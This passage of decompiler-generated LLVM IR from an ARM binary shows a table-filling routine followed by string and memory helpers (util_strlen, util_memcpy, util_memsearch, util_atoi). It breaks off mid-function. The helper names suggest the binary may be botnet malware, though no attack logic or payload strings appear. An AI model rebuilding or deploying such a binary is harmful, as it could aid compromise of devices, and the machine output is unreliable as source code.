  %v5_1157c = inttoptr i32 %v4_1157c to i16*
  store i16 16, i16* %v5_1157c, align 2
  %v0_11580 = load i32, i32* @r5, align 4
  store i32 %v0_11580, i32* @global_var_26258.442, align 4
  %v0_11584 = call i32 @malloc()
  %v0_1158c = load i32, i32* @fp, align 4
  store i32 %v0_11584, i32* @r5, align 4
  %v3_11594 = call i32 @util_memcpy(i32 %v0_11584, i32 ptrtoint (i32* @global_var_1ab84.444 to i32), i32 %v0_1158c)
  %v0_1159c = load i32, i32* @sl, align 4
  store i32 %v0_1159c, i32* @r0, align 4
  %v0_115a0 = load i32, i32* @fp, align 4
  %v1_115a0 = trunc i32 %v0_115a0 to i16
  %v2_115a0 = load i32, i32* @r4, align 4
  %v4_115a0 = add i32 %v2_115a0, 388
  %v5_115a0 = inttoptr i32 %v4_115a0 to i16*
  store i16 %v1_115a0, i16* %v5_115a0, align 2
  %v0_115a4 = load i32, i32* @r5, align 4
  store i32 %v0_115a4, i32* @global_var_26260.445, align 4
  %v0_115a8 = call i32 @malloc()
  %v0_115b0 = load i32, i32* @sl, align 4
  store i32 %v0_115a8, i32* @r5, align 4
  %v4_115b8 = call i32 @util_memcpy(i32 %v0_115a8, i32 ptrtoint ([9 x i8]* @global_var_1ab98.447 to i32), i32 %v0_115b0)
  %v0_115c0 = load i32, i32* @r7, align 4
  store i32 %v0_115c0, i32* @r0, align 4
  %v0_115c4 = load i32, i32* @sl, align 4
  %v1_115c4 = trunc i32 %v0_115c4 to i16
  %v2_115c4 = load i32, i32* @r4, align 4
  %v4_115c4 = add i32 %v2_115c4, 396
  %v5_115c4 = inttoptr i32 %v4_115c4 to i16*
  store i16 %v1_115c4, i16* %v5_115c4, align 2
  %v0_115c8 = load i32, i32* @r5, align 4
  store i32 %v0_115c8, i32* @global_var_26268.448, align 4
  %v0_115cc = call i32 @malloc()
  %v0_115d4 = load i32, i32* @r7, align 4
  store i32 %v0_115cc, i32* @r5, align 4
  %v3_115dc = call i32 @util_memcpy(i32 %v0_115cc, i32 ptrtoint (i32* @global_var_1aaf8.450 to i32), i32 %v0_115d4)
  %v0_115e4 = load i32, i32* @r6, align 4
  store i32 %v0_115e4, i32* @r0, align 4
  %v0_115e8 = load i32, i32* @r7, align 4
  %v1_115e8 = trunc i32 %v0_115e8 to i16
  %v2_115e8 = load i32, i32* @r4, align 4
  %v4_115e8 = add i32 %v2_115e8, 404
  %v5_115e8 = inttoptr i32 %v4_115e8 to i16*
  store i16 %v1_115e8, i16* %v5_115e8, align 2
  %v0_115ec = load i32, i32* @r5, align 4
  store i32 %v0_115ec, i32* @global_var_26270.451, align 4
  %v0_115f0 = call i32 @malloc()
  %v0_115f4 = load i32, i32* @r6, align 4
  store i32 %v0_115f0, i32* @r5, align 4
  %v3_11600 = call i32 @util_memcpy(i32 %v0_115f0, i32 ptrtoint (i32* @global_var_1aba4.453 to i32), i32 %v0_115f4)
  store i32 18, i32* @r0, align 4
  %v0_1160c = load i32, i32* @r6, align 4
  %v1_1160c = trunc i32 %v0_1160c to i16
  %v2_1160c = load i32, i32* @r4, align 4
  %v4_1160c = add i32 %v2_1160c, 412
  %v5_1160c = inttoptr i32 %v4_1160c to i16*
  store i16 %v1_1160c, i16* %v5_1160c, align 2
  %v0_11610 = load i32, i32* @r5, align 4
  store i32 %v0_11610, i32* @global_var_26278.454, align 4
  %v0_11614 = call i32 @malloc()
  store i32 %v0_11614, i32* @r5, align 4
  %v3_11624 = call i32 @util_memcpy(i32 %v0_11614, i32 ptrtoint (i32* @global_var_1abb4.456 to i32), i32 18)
  store i32 25, i32* @r0, align 4
  %v2_11634 = load i32, i32* @r4, align 4
  %v4_11634 = add i32 %v2_11634, 420
  %v5_11634 = inttoptr i32 %v4_11634 to i16*
  store i16 18, i16* %v5_11634, align 2
  %v0_11638 = load i32, i32* @r5, align 4
  store i32 %v0_11638, i32* @global_var_26280.457, align 4
  %v0_1163c = call i32 @malloc()
  store i32 %v0_1163c, i32* %r5.global-to-local, align 4
  %v3_1164c = call i32 @util_memcpy(i32 %v0_1163c, i32 ptrtoint (i32* @global_var_1abc8.459 to i32), i32 25)
  store i32 115, i32* @r0, align 4
  %v2_1165c = load i32, i32* @r4, align 4
  %v4_1165c = add i32 %v2_1165c, 428
  %v5_1165c = inttoptr i32 %v4_1165c to i16*
  store i16 25, i16* %v5_1165c, align 2
  %v0_11660 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11660, i32* @global_var_26288.460, align 4
  %v0_11664 = load i32, i32* @r0, align 4
  store i32 %v0_11664, i32* @r5, align 4
  %v0_11668 = call i32 @malloc()
  %v0_1166c = load i32, i32* @r5, align 4
  store i32 %v0_11668, i32* @r6, align 4
  %v3_11678 = call i32 @util_memcpy(i32 %v0_11668, i32 ptrtoint (i32* @global_var_1abe4.462 to i32), i32 %v0_1166c)
  %v0_11680 = load i32, i32* @r5, align 4
  store i32 %v0_11680, i32* @r0, align 4
  %v1_11684 = trunc i32 %v0_11680 to i16
  %v2_11684 = load i32, i32* @r4, align 4
  %v4_11684 = add i32 %v2_11684, 436
  %v5_11684 = inttoptr i32 %v4_11684 to i16*
  store i16 %v1_11684, i16* %v5_11684, align 2
  %v0_11688 = load i32, i32* @r6, align 4
  store i32 %v0_11688, i32* @global_var_26290.463, align 4
  %v0_1168c = call i32 @malloc()
  %v0_11690 = load i32, i32* @r5, align 4
  store i32 %v0_1168c, i32* @r6, align 4
  %v3_1169c = call i32 @util_memcpy(i32 %v0_1168c, i32 ptrtoint (i32* @global_var_1ac58.465 to i32), i32 %v0_11690)
  store i32 79, i32* @r0, align 4
  %v0_116a8 = load i32, i32* @r5, align 4
  %v1_116a8 = trunc i32 %v0_116a8 to i16
  %v2_116a8 = load i32, i32* @r4, align 4
  %v4_116a8 = add i32 %v2_116a8, 444
  %v5_116a8 = inttoptr i32 %v4_116a8 to i16*
  store i16 %v1_116a8, i16* %v5_116a8, align 2
  %v0_116ac = load i32, i32* @r6, align 4
  store i32 %v0_116ac, i32* @global_var_26298.466, align 4
  %v0_116b0 = call i32 @malloc()
  store i32 %v0_116b0, i32* %r5.global-to-local, align 4
  %v3_116c0 = call i32 @util_memcpy(i32 %v0_116b0, i32 ptrtoint (i32* @global_var_1accc.468 to i32), i32 79)
  store i32 114, i32* @r0, align 4
  %v2_116d0 = load i32, i32* @r4, align 4
  %v4_116d0 = add i32 %v2_116d0, 452
  %v5_116d0 = inttoptr i32 %v4_116d0 to i16*
  store i16 79, i16* %v5_116d0, align 2
  %v0_116d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116d4, i32* @global_var_262a0.469, align 4
  %v0_116d8 = load i32, i32* @r0, align 4
  store i32 %v0_116d8, i32* @r5, align 4
  %v0_116dc = call i32 @malloc()
  %v0_116e0 = load i32, i32* @r5, align 4
  store i32 %v0_116dc, i32* @r6, align 4
  %v3_116ec = call i32 @util_memcpy(i32 %v0_116dc, i32 ptrtoint (i32* @global_var_1ad1c.471 to i32), i32 %v0_116e0)
  %v0_116f4 = load i32, i32* @r5, align 4
  store i32 %v0_116f4, i32* @r0, align 4
  %v1_116f8 = trunc i32 %v0_116f4 to i16
  %v2_116f8 = load i32, i32* @r4, align 4
  %v4_116f8 = add i32 %v2_116f8, 460
  %v5_116f8 = inttoptr i32 %v4_116f8 to i16*
  store i16 %v1_116f8, i16* %v5_116f8, align 2
  %v0_116fc = load i32, i32* @r6, align 4
  store i32 %v0_116fc, i32* @global_var_262a8.472, align 4
  %v0_11700 = call i32 @malloc()
  %v0_11704 = load i32, i32* @r5, align 4
  store i32 %v0_11700, i32* @r6, align 4
  %v3_11710 = call i32 @util_memcpy(i32 %v0_11700, i32 ptrtoint (i32* @global_var_1ad90.474 to i32), i32 %v0_11704)
  store i32 14, i32* @r0, align 4
  %v0_1171c = load i32, i32* @r5, align 4
  %v1_1171c = trunc i32 %v0_1171c to i16
  %v2_1171c = load i32, i32* @r4, align 4
  %v4_1171c = add i32 %v2_1171c, 468
  %v5_1171c = inttoptr i32 %v4_1171c to i16*
  store i16 %v1_1171c, i16* %v5_1171c, align 2
  %v0_11720 = load i32, i32* @r6, align 4
  store i32 %v0_11720, i32* @global_var_262b0.475, align 4
  %v0_11724 = call i32 @malloc()
  store i32 %v0_11724, i32* @r5, align 4
  %v3_11734 = call i32 @util_memcpy(i32 %v0_11724, i32 ptrtoint (i32* @global_var_1a9b0.346 to i32), i32 14)
  %v0_11740 = load i32, i32* @fp, align 4
  store i32 %v0_11740, i32* @r0, align 4
  %v2_11744 = load i32, i32* @r4, align 4
  %v4_11744 = add i32 %v2_11744, 476
  %v5_11744 = inttoptr i32 %v4_11744 to i16*
  store i16 14, i16* %v5_11744, align 2
  %v0_11748 = load i32, i32* @r5, align 4
  store i32 %v0_11748, i32* @global_var_262b8.476, align 4
  %v0_1174c = call i32 @malloc()
  %v0_11754 = load i32, i32* @fp, align 4
  store i32 %v0_1174c, i32* @r5, align 4
  %v3_1175c = call i32 @util_memcpy(i32 %v0_1174c, i32 ptrtoint (i32* @global_var_1a9c0.350 to i32), i32 %v0_11754)
  %v0_11764 = load i32, i32* @r8, align 4
  store i32 %v0_11764, i32* @r0, align 4
  %v0_11768 = load i32, i32* @fp, align 4
  %v1_11768 = trunc i32 %v0_11768 to i16
  %v2_11768 = load i32, i32* @r4, align 4
  %v4_11768 = add i32 %v2_11768, 484
  %v5_11768 = inttoptr i32 %v4_11768 to i16*
  store i16 %v1_11768, i16* %v5_11768, align 2
  %v0_1176c = load i32, i32* @r5, align 4
  store i32 %v0_1176c, i32* @global_var_262c0.477, align 4
  %v0_11770 = call i32 @malloc()
  %v0_11778 = load i32, i32* @r8, align 4
  store i32 %v0_11770, i32* @r5, align 4
  %v3_11780 = call i32 @util_memcpy(i32 %v0_11770, i32 ptrtoint (i32* @global_var_1a98c.338 to i32), i32 %v0_11778)
  %v0_11788 = load i32, i32* @sb, align 4
  store i32 %v0_11788, i32* @r0, align 4
  %v0_1178c = load i32, i32* @r8, align 4
  %v1_1178c = trunc i32 %v0_1178c to i16
  %v2_1178c = load i32, i32* @r4, align 4
  %v4_1178c = add i32 %v2_1178c, 492
  %v5_1178c = inttoptr i32 %v4_1178c to i16*
  store i16 %v1_1178c, i16* %v5_1178c, align 2
  %v0_11790 = load i32, i32* @r5, align 4
  store i32 %v0_11790, i32* @global_var_262c8.478, align 4
  %v0_11794 = call i32 @malloc()
  %v0_1179c = load i32, i32* @sb, align 4
  store i32 %v0_11794, i32* %r5.global-to-local, align 4
  %v4_117a4 = call i32 @util_memcpy(i32 %v0_11794, i32 ptrtoint ([11 x i8]* @global_var_1ae04.480 to i32), i32 %v0_1179c)
  %v0_117ac = load i32, i32* @sb, align 4
  %v1_117ac = trunc i32 %v0_117ac to i16
  %v2_117ac = load i32, i32* @r4, align 4
  %v4_117ac = add i32 %v2_117ac, 500
  %v5_117ac = inttoptr i32 %v4_117ac to i16*
  store i16 %v1_117ac, i16* %v5_117ac, align 2
  %v0_117b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_117b0, i32* @global_var_262d0.481, align 4
  store i32 %v3_10f20, i32* @r4, align 4
  store i32 %v6_10f20, i32* @r5, align 4
  store i32 %v9_10f20, i32* @r6, align 4
  store i32 %v12_10f20, i32* @r7, align 4
  store i32 %v15_10f20, i32* @r8, align 4
  store i32 %v21_10f20, i32* @sl, align 4
  store i32 %v24_10f20, i32* @fp, align 4
  ret i32 %v4_117a4

; uselistorder directives
  uselistorder i32 %v0_11794, { 1, 0 }
  uselistorder i32 %v0_11770, { 1, 0 }
  uselistorder i32 %v0_1174c, { 1, 0 }
  uselistorder i32 %v0_11700, { 1, 0 }
  uselistorder i32 %v0_116dc, { 1, 0 }
  uselistorder i32 %v0_1168c, { 1, 0 }
  uselistorder i32 %v0_11668, { 1, 0 }
  uselistorder i32 %v0_115f0, { 1, 0 }
  uselistorder i32 %v0_115cc, { 1, 0 }
  uselistorder i32 %v0_115a8, { 1, 0 }
  uselistorder i32 %v0_11584, { 1, 0 }
  uselistorder i32 %v0_11538, { 1, 0 }
  uselistorder i32 %v0_114ec, { 1, 0 }
  uselistorder i32 %v0_114c4, { 1, 0 }
  uselistorder i32 %v0_11428, { 1, 0 }
  uselistorder i32 %v0_113b4, { 1, 0 }
  uselistorder i32 %v0_11390, { 1, 0 }
  uselistorder i32 %v0_11340, { 1, 0 }
  uselistorder i32 %v0_112f8, { 1, 0 }
  uselistorder i32 %v0_112d8, { 1, 0 }
  uselistorder i32 %v0_11294, { 1, 0 }
  uselistorder i32 %v0_11250, { 1, 0 }
  uselistorder i32 %v0_11230, { 1, 0 }
  uselistorder i32 %v0_11210, { 1, 0 }
  uselistorder i32 %v0_111a8, { 1, 0 }
  uselistorder i32 %v0_11188, { 1, 0 }
  uselistorder i32 %v0_11144, { 1, 0 }
  uselistorder i32 %v0_11120, { 1, 0 }
  uselistorder i32 %v0_110fc, { 1, 0 }
  uselistorder i32 %v0_110d8, { 1, 0 }
  uselistorder i32 %v0_11070, { 1, 0 }
  uselistorder i32 %v0_1104c, { 1, 0 }
  uselistorder i32 %v0_11028, { 1, 0 }
  uselistorder i32 %v0_10f98, { 1, 0 }
  uselistorder i32 %v0_10f54, { 1, 0 }
  uselistorder i32 %v0_10f2c, { 1, 0 }
  uselistorder i32 284, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 23, { 0, 2, 3, 1, 4 }
  uselistorder i32 29, { 0, 9, 1, 6, 2, 7, 3, 8, 10, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 1, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_260e0.274 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_118a8 = load i8, i8* %arg1, align 1
  %v2_118ac = icmp eq i8 %v3_118a8, 0
  %v0_118b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_118ac, i32 %v0_118b0)
  br label %dec_label_pc_118b8

dec_label_pc_118b8:                               ; preds = %dec_label_pc_118b8, %entry
  %v0_118b8 = phi i32 [ %v1_118b8, %dec_label_pc_118b8 ], [ 0, %entry ]
  %v1_118b8 = add i32 %v0_118b8, 1
  %v2_118bc = add i32 %v1_118b8, %tmp
  %v3_118bc = inttoptr i32 %v2_118bc to i8*
  %v4_118bc = load i8, i8* %v3_118bc, align 1
  %v6_118bc = zext i8 %v4_118bc to i32
  store i32 %v6_118bc, i32* @r3, align 4
  %v2_118c0 = icmp eq i8 %v4_118bc, 0
  br i1 %v2_118c0, label %dec_label_pc_118c8, label %dec_label_pc_118b8

dec_label_pc_118c8:                               ; preds = %dec_label_pc_118b8
  ret i32 %v1_118b8
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_118cc = load i8, i8* %arg1, align 1
  %v3_118cc = zext i8 %v2_118cc to i32
  %v2_118d0 = icmp eq i8 %v2_118cc, 0
  br i1 %v2_118d0, label %bb, label %dec_label_pc_118dc

bb:                                               ; preds = %entry
  store i32 %v3_118cc, i32* @ip, align 4
  br label %dec_label_pc_118f0

dec_label_pc_118dc:                               ; preds = %entry
  br label %dec_label_pc_118e0

dec_label_pc_118e0:                               ; preds = %dec_label_pc_118e0, %dec_label_pc_118dc
  %v0_118e0 = phi i32 [ %v1_118e0, %dec_label_pc_118e0 ], [ 0, %dec_label_pc_118dc ]
  %v1_118e0 = add i32 %v0_118e0, 1
  store i32 %v1_118e0, i32* @ip, align 4
  %v2_118e4 = add i32 %v1_118e0, %tmp
  %v3_118e4 = inttoptr i32 %v2_118e4 to i8*
  %v4_118e4 = load i8, i8* %v3_118e4, align 1
  %v2_118e8 = icmp eq i8 %v4_118e4, 0
  br i1 %v2_118e8, label %dec_label_pc_118f0, label %dec_label_pc_118e0

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118e0, %bb
  %v0_118f0 = phi i32 [ %v3_118cc, %bb ], [ %v1_118e0, %dec_label_pc_118e0 ]
  br label %dec_label_pc_118fc

dec_label_pc_118f8:                               ; preds = %dec_label_pc_118fc
  %v0_118f8 = load i32, i32* @r1, align 4
  %v1_118f8 = add i32 %v0_118f8, 1
  %v2_118f8 = inttoptr i32 %v1_118f8 to i8*
  %v3_118f8 = load i8, i8* %v2_118f8, align 1
  store i32 %v1_118f8, i32* @r1, align 4
  %v0_118fc.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_118fc

dec_label_pc_118fc:                               ; preds = %dec_label_pc_118f0, %dec_label_pc_118f8
  %v0_11904.off0 = phi i8 [ %v2_118cc, %dec_label_pc_118f0 ], [ %v3_118f8, %dec_label_pc_118f8 ]
  %v0_118fc = phi i32 [ %v0_118f0, %dec_label_pc_118f0 ], [ %v0_118fc.pr, %dec_label_pc_118f8 ]
  %v1_118fc = add i32 %v0_118fc, -1
  store i32 %v1_118fc, i32* @r3, align 4
  %v3_11900 = icmp eq i32 %v0_118fc, 0
  %v2_11904 = load i32, i32* @r0, align 4
  %v3_11904 = inttoptr i32 %v2_11904 to i8*
  store i8 %v0_11904.off0, i8* %v3_11904, align 1
  %v4_11904 = load i32, i32* @r0, align 4
  %v5_11904 = add i32 %v4_11904, 1
  store i32 %v5_11904, i32* @r0, align 4
  br i1 %v3_11900, label %dec_label_pc_1190c, label %dec_label_pc_118f8

dec_label_pc_1190c:                               ; preds = %dec_label_pc_118fc
  %v0_1190c = load i32, i32* @ip, align 4
  ret i32 %v0_1190c

; uselistorder directives
  uselistorder i32 %v0_118fc, { 1, 0 }
  uselistorder i32 %v1_118e0, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_118fc, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_11914 = icmp eq i32 %arg3, 0
  %v0_11918 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11914, i32 %v0_11918)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11920

dec_label_pc_11920:                               ; preds = %dec_label_pc_11920, %entry
  %v0_11920 = phi i32 [ %v1_11928, %dec_label_pc_11920 ], [ 0, %entry ]
  %v2_11920 = add i32 %v0_11920, %arg2
  %v3_11920 = inttoptr i32 %v2_11920 to i8*
  %v4_11920 = load i8, i8* %v3_11920, align 1
  %v4_11924 = add i32 %v0_11920, %arg1
  %v5_11924 = inttoptr i32 %v4_11924 to i8*
  store i8 %v4_11920, i8* %v5_11924, align 1
  %v0_11928 = load i32, i32* %ip.global-to-local, align 4
  %v1_11928 = add i32 %v0_11928, 1
  store i32 %v1_11928, i32* %ip.global-to-local, align 4
  %v9_1192c = icmp eq i32 %v1_11928, %arg3
  br i1 %v9_1192c, label %dec_label_pc_11934, label %dec_label_pc_11920

dec_label_pc_11934:                               ; preds = %dec_label_pc_11920
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_11928, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v2_11938 = icmp eq i32 %arg2, 0
  %v0_1193c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11938, i32 %v0_1193c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11944

dec_label_pc_11944:                               ; preds = %dec_label_pc_11944, %entry
  %v2_11948 = phi i32 [ %v1_1194c, %dec_label_pc_11944 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v4_11948 = add i32 %v2_11948, %arg1
  %v5_11948 = inttoptr i32 %v4_11948 to i8*
  store i8 0, i8* %v5_11948, align 1
  %v0_1194c = load i32, i32* %r2.global-to-local, align 4
  %v1_1194c = add i32 %v0_1194c, 1
  store i32 %v1_1194c, i32* %r2.global-to-local, align 4
  %v9_11950 = icmp eq i32 %v1_1194c, %arg2
  br i1 %v9_11950, label %dec_label_pc_11958, label %dec_label_pc_11944

dec_label_pc_11958:                               ; preds = %dec_label_pc_11944
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1194c, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_11970 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_11970, label %dec_label_pc_11978, label %dec_label_pc_11980

dec_label_pc_11978:                               ; preds = %dec_label_pc_11994, %dec_label_pc_11980, %entry, %dec_label_pc_119c0
  %storemerge = phi i32 [ %v1_119c0, %dec_label_pc_119c0 ], [ -1, %entry ], [ -1, %dec_label_pc_11980 ], [ -1, %dec_label_pc_11994 ]
  ret i32 %storemerge

dec_label_pc_11980:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_11978, label %dec_label_pc_11988

dec_label_pc_11988:                               ; preds = %dec_label_pc_11980
  br label %dec_label_pc_119a0

dec_label_pc_11994:                               ; preds = %bb, %dec_label_pc_119b4
  %v1_119a03 = phi i32 [ %v1_119b4, %dec_label_pc_119b4 ], [ 0, %bb ]
  %v1_11994 = add i32 %v0_119c0, 1
  %v9_11998 = icmp eq i32 %v1_11994, %arg2
  br i1 %v9_11998, label %dec_label_pc_11978, label %dec_label_pc_119a0

dec_label_pc_119a0:                               ; preds = %dec_label_pc_11994, %dec_label_pc_11988
  %v0_119c0 = phi i32 [ %v1_11994, %dec_label_pc_11994 ], [ 0, %dec_label_pc_11988 ]
  %v1_119a0 = phi i32 [ %v1_119a03, %dec_label_pc_11994 ], [ 0, %dec_label_pc_11988 ]
  %v2_119a0 = add i32 %v1_119a0, %arg3
  %v3_119a0 = inttoptr i32 %v2_119a0 to i8*
  %v4_119a0 = load i8, i8* %v3_119a0, align 1
  %v2_119a4 = add i32 %v0_119c0, %arg1
  %v3_119a4 = inttoptr i32 %v2_119a4 to i8*
  %v4_119a4 = load i8, i8* %v3_119a4, align 1
  %v9_119a8 = icmp eq i8 %v4_119a4, %v4_119a0
  br i1 %v9_119a8, label %dec_label_pc_119b4, label %bb

bb:                                               ; preds = %dec_label_pc_119a0
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_11994

dec_label_pc_119b4:                               ; preds = %dec_label_pc_119a0
  %v1_119b4 = add i32 %v1_119a0, 1
  store i32 %v1_119b4, i32* @ip, align 4
  %v9_119b8 = icmp eq i32 %v1_119b4, %arg4
  br i1 %v9_119b8, label %dec_label_pc_119c0, label %dec_label_pc_11994

dec_label_pc_119c0:                               ; preds = %dec_label_pc_119b4
  %v1_119c0 = add i32 %v0_119c0, 1
  br label %dec_label_pc_11978

; uselistorder directives
  uselistorder i32 %v1_119b4, { 1, 2, 0 }
  uselistorder i32 %v1_119a0, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11994, { 1, 0 }
  uselistorder label %dec_label_pc_11978, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_119d8

dec_label_pc_119d8:                               ; preds = %.thread, %dec_label_pc_119ec, %bb, %entry
  %v0_119d8 = phi i32 [ %tmp, %entry ], [ %v5_119d8, %bb ], [ %v5_119d8, %dec_label_pc_119ec ], [ %v5_119d8, %.thread ]
  %v1_119d8 = inttoptr i32 %v0_119d8 to i8*
  %v2_119d8 = load i8, i8* %v1_119d8, align 1
  %v5_119d8 = add i32 %v0_119d8, 1
  %v7_119dc = icmp eq i8 %v2_119d8, 9
  br i1 %v7_119dc, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_119d8
  br label %dec_label_pc_119d8

bb:                                               ; preds = %dec_label_pc_119d8
  %v8_119e0 = icmp eq i8 %v2_119d8, 32
  br i1 %v8_119e0, label %dec_label_pc_119d8, label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %bb
  %v7_119ec = icmp eq i8 %v2_119d8, 10
  br i1 %v7_119ec, label %dec_label_pc_119d8, label %dec_label_pc_119f4

dec_label_pc_119f4:                               ; preds = %dec_label_pc_119ec
  %v7_119f4 = icmp eq i8 %v2_119d8, 45
  br i1 %v7_119f4, label %dec_label_pc_11ae4, label %dec_label_pc_119fc

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119f4
  %v7_119fc = icmp eq i8 %v2_119d8, 43
  br i1 %v7_119fc, label %bb54, label %dec_label_pc_11a0c

bb54:                                             ; preds = %dec_label_pc_119fc
  %v2_11a00 = inttoptr i32 %v5_119d8 to i8*
  %v3_11a00 = load i8, i8* %v2_11a00, align 1
  %v6_11a00 = add i32 %v0_119d8, 2
  br label %dec_label_pc_11a0c

dec_label_pc_11a0c:                               ; preds = %bb54, %dec_label_pc_119fc, %dec_label_pc_11ae4
  %v1_11ab439 = phi i32 [ %v5_11ae4, %dec_label_pc_11ae4 ], [ %v5_119d8, %dec_label_pc_119fc ], [ %v6_11a00, %bb54 ]
  %v0_11a3410.in = phi i8 [ %v2_11ae4, %dec_label_pc_11ae4 ], [ %v2_119d8, %dec_label_pc_119fc ], [ %v3_11a00, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_11ae4 ], [ 2147483647, %dec_label_pc_119fc ], [ 2147483647, %bb54 ]
  %v0_11af4 = phi i32 [ 1, %dec_label_pc_11ae4 ], [ 0, %dec_label_pc_119fc ], [ 0, %bb54 ]
  %v2_11a14 = udiv i32 %storemerge1, %arg2
  %v3_11a14 = urem i32 %storemerge1, %arg2
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_11a34.outer

dec_label_pc_11a34.outer:                         ; preds = %.thread5, %dec_label_pc_11a0c
  %v1_11ab4.ph = phi i32 [ %v6_11ab4, %.thread5 ], [ %v1_11ab439, %dec_label_pc_11a0c ]
  %v2_11ab0.ph = phi i32 [ %v5_11ab0, %.thread5 ], [ 0, %dec_label_pc_11a0c ]
  %v1_11a74.ph.in = phi i8 [ %v3_11ab4, %.thread5 ], [ %v0_11a3410.in, %dec_label_pc_11a0c ]
  %v1_11a8c.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_11a0c ]
  %v3_11a80 = icmp uge i32 %v2_11ab0.ph, %v2_11a14
  %v9_11a80 = icmp eq i32 %v2_11ab0.ph, %v2_11a14
  %v2_11a84 = xor i1 %v3_11a80, true
  %v3_11a84 = or i1 %v9_11a80, %v2_11a84
  %v2_11a88 = xor i1 %v9_11a80, true
  %v3_11a88 = and i1 %v3_11a80, %v2_11a88
  %v2_11aa8 = icmp eq i1 %v9_11a80, false
  br label %dec_label_pc_11a34

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a34.outer, %dec_label_pc_11abc
  %v1_11ab4 = phi i32 [ %v5_11abc, %dec_label_pc_11abc ], [ %v1_11ab4.ph, %dec_label_pc_11a34.outer ]
  %v1_11a8c = phi i32 [ -1, %dec_label_pc_11abc ], [ %v1_11a8c.ph, %dec_label_pc_11a34.outer ]
  %v1_11a74.in = phi i8 [ %v2_11abc, %dec_label_pc_11abc ], [ %v1_11a74.ph.in, %dec_label_pc_11a34.outer ]
  %v1_11a74 = zext i8 %v1_11a74.in to i32
  %v1_11a34 = urem i32 %v1_11a74, 256
  %v1_11a38 = add nsw i32 %v1_11a34, -48
  %v1_11a40 = add nsw i32 %v1_11a34, -97
  %v1_11a44 = add nsw i32 %v1_11a74, -48
  %v1_11a48 = add nsw i32 %v1_11a34, -65
  %tmp87 = icmp ult i32 %v1_11a38, 10
  br i1 %tmp87, label %dec_label_pc_11a78, label %dec_label_pc_11a50

dec_label_pc_11a50:                               ; preds = %dec_label_pc_11a34
  %v2_11a50 = icmp ugt i32 %v1_11a48, 24
  %v7_11a50 = icmp eq i32 %v1_11a48, 25
  %v2_11a54 = xor i1 %v7_11a50, true
  %v3_11a54 = and i1 %v2_11a50, %v2_11a54
  br i1 %v3_11a54, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_11a50
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_11a50, %bb55
  %v0_11a6815 = phi i32 [ %v1_11a44, %dec_label_pc_11a50 ], [ 0, %bb55 ]
  %v2_11a58 = xor i1 %v2_11a50, true
  %v3_11a58 = or i1 %v7_11a50, %v2_11a58
  br i1 %v3_11a58, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_11a68 = phi i32 [ %v0_11a6815, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_11a54, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_11a60 = icmp ugt i32 %v1_11a40, 24
  %v11_11a60 = icmp eq i32 %v1_11a40, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_11a64 = phi i1 [ %v7_11a50, %bb58 ], [ %v11_11a60, %bb59 ]
